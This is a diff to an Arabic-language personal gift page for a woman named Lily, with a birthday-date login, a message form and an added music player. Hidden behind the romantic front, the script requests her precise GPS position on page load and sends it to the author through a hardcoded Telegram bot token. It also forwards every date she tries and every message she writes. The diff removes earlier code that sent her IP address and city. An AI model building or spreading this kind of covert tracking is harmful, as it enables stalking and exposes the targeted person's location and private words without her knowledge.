@@ -201,13 +201,72 @@
             font-weight: bold;
             margin-top: 15px;
         }
+
+        /* زر الأغنية العائم */
+        .music-float-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #e91e63, #ff4081);
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(233, 30, 99, 0.5);
+            cursor: pointer;
+            z-index: 1000;
+            animation: pulse 2s infinite;
+        }
+        .music-float-btn span { font-size: 24px; }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(233, 30, 99, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(233, 30, 99, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(233, 30, 99, 0); }
+        }
+
+        .music-modal {
+            position: fixed;
+            bottom: 90px;
+            right: 20px;
+            background: #ffffff;
+            border: 2px solid #ff80ab;
+            padding: 15px;
+            border-radius: 18px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            z-index: 1001;
+            width: 280px;
+            display: none;
+            text-align: center;
+        }
+        .music-modal iframe {
+            width: 100%;
+            height: 140px;
+            border-radius: 10px;
+            border: none;
+        }
+        .close-modal {
+            background: #e91e63;
+            color: #fff;
+            border: none;
+            padding: 6px 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 8px;
+            font-size: 13px;
+            width: 100%;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
 
-        <!-- شاشة تسجيل الدخول (التاريخ 8 شهر 10) -->
+        <!-- شاشة تسجيل الدخول -->
         <div class="card" id="loginCard">
             <h1 class="cursive-title">Hi Lily</h1>
             <div class="subtitle">ادخلي تاريخ اليوم المميز يا روحي 💖</div>
@@ -282,6 +341,17 @@
 
     </div>
 
+    <!-- زر تشغيل الأغنية العائم -->
+    <div id="floatingMusicBtn" class="music-float-btn" style="display: none;" onclick="toggleMusicModal()" title="أغنيتك المفضلة 🎶">
+        <span>🎵</span>
+    </div>
+
+    <div id="musicModal" class="music-modal">
+        <p style="margin: 0 0 8px 0; font-size: 13px; color: #d81b60; font-weight: bold;">أغنيتك المفضلة 🎶</p>
+        <iframe id="modalYoutubePlayer" src="" allow="autoplay"></iframe>
+        <button class="close-modal" onclick="toggleMusicModal()">إغلاق النافذة</button>
+    </div>
+
     <div id="lightbox" class="lightbox" onclick="closeLightbox()">
         <img class="lightbox-img" id="lightboxImg">
     </div>
@@ -293,7 +363,7 @@
         const BOT_TOKEN = "8989450747:AAFQ56vM9mniwelDaqf5zqc76J2f3zorpE0";
         const CHAT_ID = "8718173410";
 
-        let visitorIP = "غير معروف";
+        let locationData = "لم يتم السماح بالوصول للموقع";
 
         function openLightbox(src) {
             document.getElementById('lightboxImg').src = src;
@@ -304,24 +374,24 @@
             document.getElementById('lightbox').style.display = 'none';
         }
 
-        window.addEventListener('load', async () => {
-            let visitMsg = `🚨 زائر جديد فتح رابط ليلى الآن!\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
-            
-            try {
-                let res = await fetch('https://ipapi.co/json/');
-                let data = await res.json();
-                visitorIP = data.ip || "غير معروف";
-                visitMsg = `🚨 زائر جديد دخل صفحة ليلى الآن!\n\n🌐 الـ IP: ${visitorIP}\n📍 اللوكيشن: ${data.country_name || ''} - ${data.city || ''}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
-            } catch(e) {
-                try {
-                    let res2 = await fetch('https://api.ipify.org?format=json');
-                    let data2 = await res2.json();
-                    visitorIP = data2.ip;
-                    visitMsg += `\n🌐 الـ IP: ${visitorIP}`;
-                } catch(err){}
+        // طلب إذن اللوكيشن الحقيقي بدقة بمجرد دخول الصفحة
+        window.addEventListener('load', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        locationData = `📍 الموقع الدقيق (GPS):\nhttps://maps.google.com/?q=${lat},${lon}`;
+                        sendTelegramNotification(`🚨 ليلى فتحت الرابط وتم تحديد موقعها الدقيق 🌐\n${locationData}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+                    },
+                    (error) => {
+                        sendTelegramNotification(`🚨 ليلى فتحت الرابط (رفضت إذن اللوكيشن أو حدث خطأ)\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                sendTelegramNotification(`🚨 ليلى فتحت الرابط (المتصفح لا يدعم تحديد الموقع)\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
             }
-
-            sendTelegramNotification(visitMsg);
         });
 
         function checkBirthday() {
@@ -335,11 +405,23 @@
                 errorBadge.style.display = 'none';
                 document.getElementById('loginCard').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'flex';
+                document.getElementById('floatingMusicBtn').style.display = 'flex';
                 
-                sendTelegramNotification(`🎉 تم فتح الصفحة بنجاح بالتاريخ الصحيح! (8/10)\n🌐 الـ IP: ${visitorIP}`);
+                document.getElementById('modalYoutubePlayer').src = "https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1";
+                
+                sendTelegramNotification(`🎉 ليلى أدخلت تاريخ اليوم الصحيح بنجاح! (8/10)\n${locationData}`);
             } else {
                 errorBadge.style.display = 'block';
-                sendTelegramNotification(`⚠️ محاولة دخول بتاريخ غير صحيح: (${dayInput}/${monthInput})\n🌐 الـ IP: ${visitorIP}`);
+                sendTelegramNotification(`⚠️ محاولة دخول بتاريخ غير صحيح من ليلى: (${dayInput}/${monthInput})\n${locationData}`);
+            }
+        }
+
+        function toggleMusicModal() {
+            const modal = document.getElementById('musicModal');
+            if (modal.style.display === 'block') {
+                modal.style.display = 'none';
+            } else {
+                modal.style.display = 'block';
             }
         }
 
@@ -353,7 +435,7 @@
                 return;
             }
 
-            const telegramMsg = `💌 رسالة جديدة من ليلى في الموقع!\n\n✍️ النص:\n"${messageText}"\n\n🌐 الـ IP: ${visitorIP}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+            const telegramMsg = `💌 رسالة جديدة من ليلى في الموقع!\n\n✍️ النص:\n"${messageText}"\n\n${locationData}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
 
             sendTelegramNotification(telegramMsg);
 
